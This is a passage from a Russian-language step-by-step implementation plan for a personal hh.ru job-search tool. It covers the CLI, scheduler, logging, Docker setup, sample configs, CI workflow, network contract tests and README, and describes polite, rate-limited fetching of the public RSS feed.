    assert len(attempts) == 2
```

- [ ] **Step 2: Запустить тест и убедиться, что он падает**

Run: `uv run pytest tests/test_cli.py -v`
Expected: FAIL с `ModuleNotFoundError: No module named 'hh_search.__main__'`

- [ ] **Step 3: Реализовать `hh_search/logging_setup.py`**

```python
import logging
import sys
from logging.handlers import RotatingFileHandler
from pathlib import Path

FORMAT = "%(asctime)s %(levelname)-7s %(name)s: %(message)s"


def setup_logging(logs_dir: Path, level: int = logging.INFO) -> None:
    """Логи одновременно в stdout (их забирает docker logs) и в файл с ротацией."""
    logs_dir.mkdir(parents=True, exist_ok=True)
    formatter = logging.Formatter(FORMAT)

    stream_handler = logging.StreamHandler(sys.stdout)
    stream_handler.setFormatter(formatter)

    file_handler = RotatingFileHandler(
        logs_dir / "hh.log", maxBytes=5_000_000, backupCount=5, encoding="utf-8"
    )
    file_handler.setFormatter(formatter)

    root = logging.getLogger()
    root.setLevel(level)
    root.handlers.clear()
    root.addHandler(stream_handler)
    root.addHandler(file_handler)
```

- [ ] **Step 4: Реализовать `hh_search/scheduler.py`**

```python
import logging
import time
from collections.abc import Callable

from hh_search.config.models import Config

logger = logging.getLogger(__name__)


def serve(
    config: Config,
    run: Callable[[], None],
    sleep: Callable[[float], None] = time.sleep,
    iterations: int | None = None,
) -> None:
    """Бесконечный цикл прогонов. Падение одного прогона не роняет процесс."""
    interval_seconds = config.app.schedule.interval_hours * 3600.0
    completed = 0
    while iterations is None or completed < iterations:
        try:
            run()
        except Exception:
            logger.exception("прогон завершился с ошибкой, продолжаем по расписанию")
        completed += 1
        sleep(interval_seconds)
```

- [ ] **Step 5: Реализовать `hh_search/__main__.py`**

```python
import logging
import os
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Annotated

import typer

from hh_search.config.loader import load_config
from hh_search.config.models import Config
from hh_search.logging_setup import setup_logging
from hh_search.pipeline import run_once
from hh_search.scheduler import serve
from hh_search.scoring.keyword import KeywordScorer
from hh_search.sinks import build_sinks
from hh_search.sources.http import PoliteClient
from hh_search.storage.repository import SqliteRepository

logger = logging.getLogger(__name__)
app = typer.Typer(help="Автопоиск вакансий на hh.ru", no_args_is_help=True)

DEFAULT_CONFIG_DIR = Path(os.environ.get("HH_CONFIG_DIR", "/data/config"))
ConfigDir = Annotated[Path, typer.Option("--config-dir", help="Каталог с YAML-конфигами")]


@app.callback()
def main(ctx: typer.Context, config_dir: ConfigDir = DEFAULT_CONFIG_DIR) -> None:
    ctx.obj = load_config(config_dir)


def _config(ctx: typer.Context) -> Config:
    assert isinstance(ctx.obj, Config)
    return ctx.obj


def _execute(config: Config) -> None:
    with SqliteRepository(config.app.paths.state) as repo, PoliteClient(
        config.app.http, config.app.user_agent
    ) as client:
        repo.init_schema()
        run_once(
            config,
            client,
            repo,
            KeywordScorer(config.profile),
            build_sinks(
                config.app.sinks, config.app.paths.reports, config.profile.report_threshold
            ),
        )


@app.command("init-db")
def init_db(ctx: typer.Context) -> None:
    """Создать схему базы."""
    config = _config(ctx)
    config.app.paths.state.parent.mkdir(parents=True, exist_ok=True)
    with SqliteRepository(config.app.paths.state) as repo:
        repo.init_schema()
    typer.echo(f"схема создана: {config.app.paths.state}")


@app.command("run")
def run(ctx: typer.Context) -> None:
    """Выполнить один прогон."""
    config = _config(ctx)
    setup_logging(config.app.paths.logs)
    _execute(config)


@app.command("serve")
def serve_command(ctx: typer.Context) -> None:
    """Запустить бесконечный цикл прогонов по расписанию."""
    config = _config(ctx)
    setup_logging(config.app.paths.logs)
    logger.info("старт, интервал %d ч", config.app.schedule.interval_hours)
    serve(config, lambda: _execute(config))


@app.command("healthcheck")
def healthcheck(ctx: typer.Context) -> None:
    """Код 0, если последний успешный прогон свежее двух интервалов."""
    config = _config(ctx)
    with SqliteRepository(config.app.paths.state) as repo:
        last = repo.last_successful_run()
    deadline = datetime.now(UTC) - timedelta(hours=2 * config.app.schedule.interval_hours)
    if last is None or last < deadline:
        typer.echo(f"последний успешный прогон: {last or 'никогда'}", err=True)
        raise typer.Exit(code=1)
    typer.echo(f"ok, последний успешный прогон: {last.isoformat()}")


@app.command("mark")
def mark(ctx: typer.Context, vacancy_id: str, status: str) -> None:
    """Проставить статус вакансии вручную."""
    with SqliteRepository(_config(ctx).app.paths.state) as repo:
        repo.set_status(vacancy_id, status)
    typer.echo(f"{vacancy_id} → {status}")


@app.command("report")
def report(ctx: typer.Context, since: str = typer.Option("7d", "--since")) -> None:
    """Перегенерировать отчёт из базы за последние N дней."""
    config = _config(ctx)
    days = int(since.rstrip("d") or 7)
    cutoff = datetime.now(UTC) - timedelta(days=days)
    with SqliteRepository(config.app.paths.state) as repo:
        vacancies = repo.reported_since(cutoff)
    sinks = build_sinks(
        config.app.sinks, config.app.paths.reports, config.profile.report_threshold
    )
    for sink in sinks:
        sink.emit(vacancies, datetime.now())
    typer.echo(f"перегенерировано вакансий: {len(vacancies)}")


if __name__ == "__main__":
    app()
```

- [ ] **Step 6: Дописать `reported_since` в репозиторий**

Команда `report` требует метода, которого нет в Task 6. Добавить в `hh_search/storage/repository.py` рядом с `unreported`:

```python
    def reported_since(self, cutoff: datetime) -> list[ScoredVacancy]:
        rows = self._connection.execute(
            """
            SELECT v.*, (SELECT query FROM vacancy_query q WHERE q.vacancy_id = v.id LIMIT 1)
                   AS found_by_query
            FROM vacancy v
            WHERE v.reported_at >= ? AND v.score IS NOT NULL AND v.description IS NOT NULL
            ORDER BY v.score DESC
            """,
            (cutoff.isoformat(),),
        ).fetchall()
        return [
            ScoredVacancy(
                discovered=self._to_discovered(row),
                details=VacancyDetails(description=row["description"]),
                score=ScoreBreakdown.model_validate(json.loads(row["score_detail"])),
                cluster=row["cluster"] or "",
            )
            for row in rows
        ]
```

И тест в `tests/test_repository.py`:

```python
def test_reported_since_returns_recent_reports(repo: SqliteRepository) -> None:
    from datetime import UTC, timedelta

    repo.add_discovered(make_vacancy(), "embedded", 9)
    repo.save_details("1", VacancyDetails(description="текст"))
    repo.save_score("1", make_score())
    repo.mark_reported(["1"])
    cutoff = datetime.now(UTC) - timedelta(days=1)
    assert [item.discovered.id for item in repo.reported_since(cutoff)] == ["1"]
```

- [ ] **Step 7: Запустить тесты и убедиться, что они проходят**

Run: `uv run pytest -v && uv run ruff check . && uv run mypy hh_search`
Expected: все зелёные

- [ ] **Step 8: Коммит**

```bash
git add hh_search/__main__.py hh_search/scheduler.py hh_search/logging_setup.py \
        hh_search/storage/repository.py tests/test_cli.py tests/test_repository.py
git commit -m "feat: CLI, логирование и планировщик

serve и run вызывают одну и ту же функцию — один код, два
способа запуска. Падение прогона не роняет демон: иначе контейнер
уходил бы в петлю перезапусков. healthcheck смотрит в журнал прогонов
и ловит ситуацию «процесс жив, работа не делается»."
```

---

### Task 12: Docker и образцы конфигов

**Files:**
- Create: `Dockerfile`, `compose.yaml`, `.dockerignore`
- Create: `config.example/app.yaml`, `config.example/profile.yaml`, `config.example/queries.yaml`

**Interfaces:**
- Consumes: CLI из Task 11
- Produces: рабочий образ с точкой входа `python -m hh_search serve`

- [ ] **Step 1: Создать `.dockerignore`**

```
.git
.venv
data
tests
docs
.mypy_cache
.pytest_cache
.ruff_cache
__pycache__
```

- [ ] **Step 2: Создать `Dockerfile`**

```dockerfile
FROM python:3.12-slim

COPY --from=ghcr.io/astral-sh/uv:latest /uv /usr/local/bin/uv

ENV PYTHONUNBUFFERED=1 \
    PYTHONDONTWRITEBYTECODE=1 \
    HH_CONFIG_DIR=/data/config

WORKDIR /app

# Слой зависимостей отдельно от кода, чтобы правки кода не пересобирали его.
COPY pyproject.toml ./
RUN uv pip install --system --no-cache .

COPY hh_search ./hh_search
RUN uv pip install --system --no-cache --no-deps .

RUN useradd --create-home --uid 10001 hh && mkdir -p /data && chown -R hh:hh /data
USER hh

ENTRYPOINT ["python", "-m", "hh_search"]
CMD ["serve"]
```

- [ ] **Step 3: Создать `compose.yaml`**

```yaml
services:
  hh-search:
    build: .
    image: hh-search:latest
    restart: unless-stopped
    env_file:
      - path: .env
        required: false
    volumes:
      - ./data:/data
    environment:
      TZ: Europe/Moscow
    healthcheck:
      test: ["CMD", "python", "-m", "hh_search", "healthcheck"]
      interval: 15m
      timeout: 30s
      retries: 3
      start_period: 5m
```

- [ ] **Step 4: Создать образцы конфигов**

`config.example/app.yaml` — подставьте свой email перед первым запуском:

```yaml
contact_email: "ВАШ_EMAIL@example.com"
user_agent: "hh-search/0.1 (personal job search; {contact_email})"
schedule:
  interval_hours: 4
http:
  delay_between_requests_sec: 1.0
  timeout_sec: 20
  max_retries: 3
  respect_robots: true
enrich:
  max_attempts: 3
sinks: [csv, markdown]
paths:
  state: /data/state/hh.db
  reports: /data/reports
  logs: /data/logs
```

`config.example/profile.yaml`:

```yaml
weights: {title: 0.40, stack: 0.30, responsibilities: 0.20, domain: 0.10}
saturation: {stack: 5, responsibilities: 3}
penalty_per_signal: 15
signals:
  title_roles: [team lead, tech lead, teamlead, ведущий, senior, старший, руководител]
  title_tech: [backend, embedded, linux, c++, python, node, firmware]
  stack:
    [yocto, buildroot, openwrt, bsp, arm, kernel, c++, python, node.js, typescript,
     docker, kubernetes, kafka, postgresql, clickhouse, llm, rag, mcp]
  responsibilities: [архитектур, менторинг, код-ревью, code review, проектирован, техдолг]
  domain: [телеком, встраиваем, embedded, iot, микросервис]
negative:
  [junior, стажёр, intern, 1c, продаж, рекрутер, ручное тестирование, оператор, курьер]
report_threshold: 60
```

`config.example/queries.yaml` — перенесите сюда карту из `hh_autosearch_plan.md`,
разворачивая «регион плюс удалёнка» в два запроса:

```yaml
defaults:
  experience: [between3And6, moreThan6]
  employment: full
queries:
  - {text: "Backend Team Lead", cluster: backend, weight: 10, area: [66]}
  - {text: "Backend Team Lead", cluster: backend, weight: 10, schedule: remote}
  - {text: "Tech Lead backend", cluster: backend, weight: 10, area: [66]}
  - {text: "Tech Lead backend", cluster: backend, weight: 10, schedule: remote}
  - {text: "Senior Backend Developer", cluster: backend, weight: 8, area: [66]}
  - {text: "Senior Backend Developer", cluster: backend, weight: 8, schedule: remote}
  - {text: "Node.js backend", cluster: backend, weight: 8, area: [66]}
  - {text: "Node.js backend", cluster: backend, weight: 8, schedule: remote}
  - {text: "Python backend", cluster: backend, weight: 8, area: [66]}
  - {text: "Python backend", cluster: backend, weight: 8, schedule: remote}
  - {text: "C++ Embedded Linux", cluster: embedded, weight: 10, area: [66]}
  - {text: "C++ Embedded Linux", cluster: embedded, weight: 10, schedule: remote}
  - {text: "Embedded Linux BSP", cluster: embedded, weight: 10, area: [66]}
  - {text: "Embedded Linux BSP", cluster: embedded, weight: 10, schedule: remote}
  - {text: "Yocto", cluster: embedded, weight: 9, area: [66]}
  - {text: "Yocto", cluster: embedded, weight: 9, schedule: remote}
  - {text: "Buildroot", cluster: embedded, weight: 9, schedule: remote}
  - {text: "Firmware developer", cluster: embedded, weight: 7, area: [66]}
  - {text: "Linux kernel module", cluster: embedded, weight: 8, schedule: remote}
  - {text: "Telecom C++", cluster: telecom, weight: 9, area: [66]}
  - {text: "Telecom C++", cluster: telecom, weight: 9, schedule: remote}
  - {text: "AI engineer", cluster: ai, weight: 8, schedule: remote}
  - {text: "LLM engineer", cluster: ai, weight: 9, schedule: remote}
  - {text: "RAG", cluster: ai, weight: 9, schedule: remote}
  - {text: "MCP", cluster: ai, weight: 8, schedule: remote}
  - {text: "Agentic AI", cluster: ai, weight: 9, schedule: remote}
```

- [ ] **Step 5: Проверить сборку и запуск образа**

```bash
docker build -t hh-search:latest .
mkdir -p data/config data/state data/reports data/logs
cp config.example/*.yaml data/config/
# подставьте реальный email в data/config/app.yaml перед следующей командой
docker run --rm -v "$PWD/data:/data" hh-search:latest init-db
docker run --rm -v "$PWD/data:/data" hh-search:latest healthcheck; echo "код возврата: $?"
```

Expected: `init-db` печатает путь к базе; `healthcheck` возвращает 1 (прогонов ещё не было) — это корректное поведение.

- [ ] **Step 6: Коммит**

```bash
git add Dockerfile compose.yaml .dockerignore config.example
git commit -m "feat: Docker-образ и образцы конфигурации

Слой зависимостей отделён от слоя кода, запуск от непривилегированного
пользователя, конфиг и состояние живут на volume. Комбинации
«регион плюс удалёнка» развёрнуты в отдельные запросы: RSS не умеет
ИЛИ по региону и формату, а дедупликация по id склеит пересечения."
```

---

### Task 13: CI, контрактный тест и README

**Files:**
- Create: `.github/workflows/ci.yml`, `README.md`
- Create: `tests/test_contract_network.py`
- Modify: `docs/superpowers/specs/2026-07-27-hh-autosearch-design.md` (зафиксировать два отклонения)

**Interfaces:**
- Consumes: всё предыдущее
- Produces: зелёный CI без сети; ручной контрактный тест `pytest -m network`

- [ ] **Step 1: Написать контрактный тест**

Создать `tests/test_contract_network.py`:

```python
"""Ходит в живой hh.ru. В CI пропускается, запускается вручную: pytest -m network."""

import re

import httpx
import pytest

from hh_search.sources.vacancy_page import extract_job_posting

USER_AGENT = "hh-search/0.1 (contract test)"
RSS_URL = "https://hh.ru/search/vacancy/rss?text=Yocto&order_by=publication_time"


@pytest.mark.network
def test_rss_feed_still_returns_vacancy_items() -> None:
    response = httpx.get(RSS_URL, headers={"User-Agent": USER_AGENT}, timeout=30)
    assert response.status_code == 200, "RSS-лента закрылась — см. §3.2 спеки"
    assert "<item>" in response.text
    assert re.search(r"https://hh\.ru/vacancy/\d+", response.text)


@pytest.mark.network
def test_vacancy_page_still_exposes_json_ld() -> None:
    feed = httpx.get(RSS_URL, headers={"User-Agent": USER_AGENT}, timeout=30).text
    match = re.search(r"https://hh\.ru/vacancy/(\d+)", feed)
    assert match is not None
    page = httpx.get(
        f"https://hh.ru/vacancy/{match.group(1)}",
        headers={"User-Agent": USER_AGENT},
        timeout=30,
        follow_redirects=True,
    )
    assert page.status_code == 200
    posting = extract_job_posting(page.text)
    assert posting is not None, "JSON-LD с JobPosting пропал — см. §3.4 спеки"
    assert posting.get("description")
```

- [ ] **Step 2: Убедиться, что контрактный тест пропускается по умолчанию**

Run: `uv run pytest tests/test_contract_network.py -v`
Expected: `2 deselected` (сработала настройка `addopts = "-m 'not network'"` из Task 1)

- [ ] **Step 3: Убедиться, что контрактный тест проходит вручную**

Run: `uv run pytest tests/test_contract_network.py -m network -v`
Expected: 2 passed. Если падает — источник изменился, дальше по плану идти нельзя, нужно перечитать §3 спеки.

- [ ] **Step 4: Создать `.github/workflows/ci.yml`**

```yaml
name: CI

on:
  push:
    branches: [main, master]
  pull_request:

jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: astral-sh/setup-uv@v5
        with:
          enable-cache: true

      - name: Установить зависимости
        run: uv pip install --system ".[dev]"

      - name: Линтер
        run: ruff check .

      - name: Форматирование
        run: ruff format --check .

      - name: Типы
        run: mypy hh_search

      - name: Тесты
        run: pytest -v
```

Сеть в CI не используется: контрактные тесты отсеиваются меткой `network`.

- [ ] **Step 5: Создать `README.md`**

````markdown
# hh-search

Автопоиск вакансий на hh.ru для личного использования. Регулярно проверяет
публичную RSS-ленту поиска, отсеивает нерелевантное, оценивает оставшееся по
профилю и выгружает только новые находки в CSV и Markdown.

Дизайн: [`docs/superpowers/specs/2026-07-27-hh-autosearch-design.md`](docs/superpowers/specs/2026-07-27-hh-autosearch-design.md)

## Быстрый старт

```bash
mkdir -p data/{config,state,reports,logs}
cp config.example/*.yaml data/config/
$EDITOR data/config/app.yaml     # укажите свой contact_email
docker compose build
docker compose run --rm hh-search init-db
docker compose run --rm hh-search run
docker compose up -d
```

Отчёты появятся в `data/reports/`, логи — в `data/logs/hh.log`.

## Источник данных

Публичный API hh.ru для соискателей закрыт (403; поддержка прекращена 15.12.2025),
поэтому используется публичная RSS-лента поиска и блок JSON-LD `JobPosting` со
страницы вакансии. Авторизация, куки и эмуляция браузера не применяются.

Ограничение источника: RSS отдаёт максимум 20 вакансий на запрос, пагинации нет.
Поэтому все запросы идут с `order_by=publication_time` — окно всегда содержит
самые свежие вакансии, что и требуется трекеру новинок.

## Режим работы с hh.ru

Соблюдаются: честный `User-Agent` с контактным адресом, `robots.txt`, одно
соединение за раз с паузой между запросами, `Retry-After` и экспоненциальный
backoff. Устойчивый `403` останавливает прогон — обходные пути не применяются.
Описание каждой вакансии скачивается ровно один раз за всё время.

## Настройка

| Файл | Что менять |
|---|---|
| `data/config/queries.yaml` | Набор поисковых запросов, кластеры, веса |
| `data/config/profile.yaml` | Сигналы, веса скоринга, стоп-слова, порог |
| `data/config/app.yaml` | Расписание, троттлинг, пути, контактный email |

Опечатка в конфиге роняет процесс на старте с указанием поля — это сделано
намеренно.

**Про списки сигналов:** не используйте односимвольный латинский `c` — после
нормализации русский предлог «с» превращается в него и даёт ложные срабатывания.
Пишите `c++`, `c/c++` или `си`.

## Команды

```bash
docker compose run --rm hh-search run        # разовый прогон
docker compose run --rm hh-search healthcheck       # свежесть последнего прогона
docker compose run --rm hh-search report --since 7d # перегенерировать отчёт
docker compose run --rm hh-search mark 12345 applied
```

## Разработка

```bash
uv pip install --system ".[dev]"
pytest                    # без сети
pytest -m network         # контрактные тесты против живого hh.ru
ruff check . && mypy hh_search
```

Контрактные тесты — ранняя система оповещения: если hh.ru изменит формат ленты
или уберёт JSON-LD, они об этом скажут. В CI они не запускаются, чтобы сборка не
зависела от живой выдачи.
````

- [ ] **Step 6: Зафиксировать отклонения в спеке**

В `docs/superpowers/specs/2026-07-27-hh-autosearch-design.md`:

1. В §5.1 после таблицы `run` добавить DDL таблицы `http_cache` (скопировать из
   `hh_search/storage/schema.sql`) и строку: «`http_cache` — хранит `ETag` и
   `Last-Modified` для условных запросов из §3.5.»
2. В §5.1 в таблицу `vacancy` добавить колонку `cluster_weight INTEGER NOT NULL DEFAULT 0`
   и пояснение: «вес запроса, назначившего кластер; нужен для правила из §6.2».
3. В §11 заменить строку про зависимости на: «Рантайм: `httpx`, `pydantic`,
   `PyYAML`, `typer`. `pydantic-settings` добавляется вместе с `TelegramSink` —
   в первой версии секретов нет.»
4. В §8.3 заменить `run --once` на `run` и добавить пояснение: «флаг `--once`
   убран — команда всегда выполняет ровно один прогон, отдельный режим
   задаёт `serve`».

- [ ] **Step 7: Прогнать полную проверку**

Run: `uv run pytest -v && uv run ruff check . && uv run ruff format --check . && uv run mypy hh_search`
Expected: всё зелёное, контрактные тесты deselected

- [ ] **Step 8: Коммит**

```bash
git add .github README.md tests/test_contract_network.py docs/
git commit -m "ci: сборка, контрактные тесты и README

CI гоняет линтер, типы и тесты без сети — живая выдача hh сделала бы
сборку флаки. Контрактные тесты помечены network и запускаются руками;
они ловят момент, когда hh изменит формат ленты или уберёт JSON-LD.
В спеке зафиксированы два отклонения: таблица http_cache и колонка
cluster_weight."
```

---

## Проверка готовности

После Task 13 должно выполняться:

- [ ] `docker compose build` собирается без ошибок
- [ ] `docker compose run --rm hh-search run` с реальным конфигом создаёт
      `data/reports/<дата>-new.csv` и `.md`
- [ ] Повторный `run` подряд не добавляет в отчёт ни одной вакансии
- [ ] `docker compose run --rm hh-search healthcheck` возвращает 0 после успешного прогона
- [ ] `pytest -m network` проходит — источник соответствует §3 спеки
- [ ] `docker compose up -d` поднимает контейнер, он переживает `docker restart`
